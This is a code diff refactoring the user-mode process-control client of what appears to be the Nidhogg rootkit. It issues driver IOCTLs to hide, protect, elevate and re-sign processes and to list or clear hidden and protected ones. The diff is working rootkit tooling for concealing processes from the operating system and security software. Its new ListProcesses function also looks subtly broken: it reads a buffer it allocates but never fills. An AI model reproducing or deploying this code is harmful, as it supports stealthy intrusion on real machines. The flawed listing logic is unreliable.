@@ -70,7 +70,15 @@ void ProcessHandler::HandleCommand(_In_ std::string command) {
 		std::string processType = params.at(1);
 
 		if (processType.compare("hidden") == 0) {
-			std::vector<DWORD> result = ListHiddenProcesses();
+			std::vector<DWORD> result;
+
+			try {
+				result = ListProcesses(ProcessType::Hidden);
+			}
+			catch (const ProcessHandlerException& e) {
+				std::cerr << e.what() << std::endl;
+				return;
+			}
 
 			std::cout << "[+] Hidden processes:" << std::endl;
 
@@ -79,7 +87,15 @@ void ProcessHandler::HandleCommand(_In_ std::string command) {
 			}
 		}
 		else if (processType.compare("protected") == 0) {
-			std::vector<DWORD> result = ListProtectedProcesses();
+			std::vector<DWORD> result;
+
+			try {
+				result = ListProcesses(ProcessType::Protected);
+			}
+			catch (const ProcessHandlerException& e) {
+				std::cerr << e.what() << std::endl;
+				return;
+			}
 
 			std::cout << "[+] Protected processes:" << std::endl;
 
@@ -127,15 +143,15 @@ void ProcessHandler::HandleCommand(_In_ std::string command) {
 		std::string processType = params.at(0);
 
 		if (processType.compare("all") == 0) {
-			ClearAll() ? std::cout << "All processes cleared" << std::endl :
+			ClearProcesses(ProcessType::All) ? std::cout << "All processes cleared" << std::endl :
 				std::cerr << "Failed to clear all processes" << std::endl;
 		}
 		else if (processType.compare("hidden") == 0) {
-			ClearHiddenProcesses() ? std::cout << "Hidden processes cleared" << std::endl :
+			ClearProcesses(ProcessType::Hidden) ? std::cout << "Hidden processes cleared" << std::endl :
 				std::cerr << "Failed to clear hidden processes" << std::endl;
 		}
 		else if (processType.compare("protected") == 0) {
-			ClearProtectedProcesses() ? std::cout << "Protected processes cleared" << std::endl :
+			ClearProcesses(ProcessType::Protected) ? std::cout << "Protected processes cleared" << std::endl :
 				std::cerr << "Failed to clear protected processes" << std::endl;
 		}
 		else {
@@ -180,7 +196,7 @@ bool ProcessHandler::CheckInput(_In_ const std::vector<std::string>& params) {
 */
 bool ProcessHandler::Protect(_In_ DWORD pid, _In_ bool protect) {
 	DWORD returned;
-	ProtectedProcess protectedProcess = { pid, protect };
+	IoctlProcessEntry protectedProcess = { pid, protect };
 
 	return DeviceIoControl(this->hNidhogg.get(), IOCTL_PROTECT_UNPROTECT_PROCESS, &protectedProcess, sizeof(protectedProcess),
 		nullptr, 0, &returned, nullptr);
@@ -199,7 +215,7 @@ bool ProcessHandler::Protect(_In_ DWORD pid, _In_ bool protect) {
 */
 bool ProcessHandler::Hide(_In_ DWORD pid, _In_ bool hide) {
 	DWORD returned;
-	HiddenProcess hiddenProcess = { pid, true };
+	IoctlProcessEntry hiddenProcess = { pid, hide };
 
 	return DeviceIoControl(this->hNidhogg.get(), IOCTL_HIDE_UNHIDE_PROCESS, &hiddenProcess, sizeof(hiddenProcess), nullptr, 0,
 		&returned, nullptr);
@@ -234,7 +250,7 @@ bool ProcessHandler::Elevate(_In_ DWORD pid) {
 */
 bool ProcessHandler::SetProtection(_In_ DWORD pid, _In_ UCHAR signerType, _In_ UCHAR signatureSigner) {
 	DWORD returned;
-	ProcessSignature processSignature{};
+	IoctlProcessSignature processSignature{};
 
 	processSignature.Pid = pid;
 	processSignature.SignerType = signerType;
@@ -246,96 +262,52 @@ bool ProcessHandler::SetProtection(_In_ DWORD pid, _In_ UCHAR signerType, _In_ U
 
 /*
 * Description:
-* ClearAll is responsible for issuing a IOCTL_CLEAR_PROCESSES to clear all processes.
-*
-* Parameters:
-* There are no parameters
-*
-* Returns:
-* @bool						    -- Whether the operation was successful or not.
-*/
-bool ProcessHandler::ClearAll() {
-	DWORD returned;
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr);
-}
-
-/*
-* Description:
 * ClearProtectedProcesses is responsible for issuing a IOCTL_CLEAR_PROTECTED_PROCESS to clear all protected processes.
 *
 * Parameters:
-* There are no parameters
+* @type [_In_ ProcessType] -- The type of processes to be cleared (protected).
 *
 * Returns:
-* @bool						    -- Whether the operation was successful or not.
+* @bool					   -- Whether the operation was successful or not.
 */
-bool ProcessHandler::ClearProtectedProcesses() {
+bool ProcessHandler::ClearProcesses(_In_ ProcessType type) {
 	DWORD returned;
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr);
-}
-
-/*
-* Description:
-* ClearHiddenProcesses is responsible for issuing a IOCTL_CLEAR_HIDDEN_PROCESSES to clear all hidden processes.
-*
-* Parameters:
-* There are no parameters
-*
-* Returns:
-* @bool						    -- Whether the operation was successful or not.
-*/
-bool ProcessHandler::ClearHiddenProcesses() {
-	DWORD returned;
-	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr);
+	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESSES, &type, sizeof(type), nullptr, 0, &returned, nullptr);
 }
 
 
 /*
 * Description:
-* ListProtectedProcesses is responsible for issuing a IOCTL_QUERY_PROTECTED_PROCESSES to get all protected processes.
+* ListProcesses is responsible for issuing a IOCTL_LIST_PROCESSES to get all protected or hidden processes.
 *
 * Parameters:
-* There are no parameters
+* @type [_In_ ProcessType]   -- The type of processes to be listed.
 *
 * Returns:
 * @pids [std::vector<DWORD>] -- Protected PIDS.
 */
-std::vector<DWORD> ProcessHandler::ListProtectedProcesses() {
+std::vector<DWORD> ProcessHandler::ListProcesses(_In_ ProcessType type) {
 	DWORD returned;
-	OutputProtectedProcessesList result{};
 	std::vector<DWORD> pids{};
+	IoctlProcessList result{};
+	result.Type = type;
 
-	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_QUERY_PROTECTED_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
+	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_LIST_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
 		nullptr)) {
 		return pids;
 	}
 
-	for (ULONG i = 0; i < result.PidsCount; i++)
-		pids.push_back(result.Processes[i]);
-	return pids;
-}
+	if (result.Count > 0) {
+		try {
+			result.Processes = SafeAlloc<unsigned long*>(result.Count * sizeof(ULONG));
+		}
+		catch (SafeMemoryException&) {
+			throw ProcessHandlerException("Failed to allocate memory for process list");
+		}
 
-/*
-* Description:
-* ListHiddenProcesses is responsible for issuing a IOCTL_QUERY_HIDDEN_PROCESSES to get all hidden processes.
-*
-* Parameters:
-* There are no parameters
-*
-* Returns:
-* @pids [std::vector<DWORD>] -- Hidden PIDS.
-*/
-std::vector<DWORD> ProcessHandler::ListHiddenProcesses() {
-	DWORD returned;
-	OutputProtectedProcessesList result{};
-	std::vector<DWORD> pids{};
-
-	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_QUERY_PROTECTED_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
-		nullptr)) {
-		return pids;
+		for (ULONG i = 0; i < result.Count; i++)
+			pids.push_back(result.Processes[i]);
+		SafeFree(result.Processes);
 	}
-
-	for (ULONG i = 0; i < result.PidsCount; i++)
-		pids.push_back(result.Processes[i]);
 	return pids;
 }
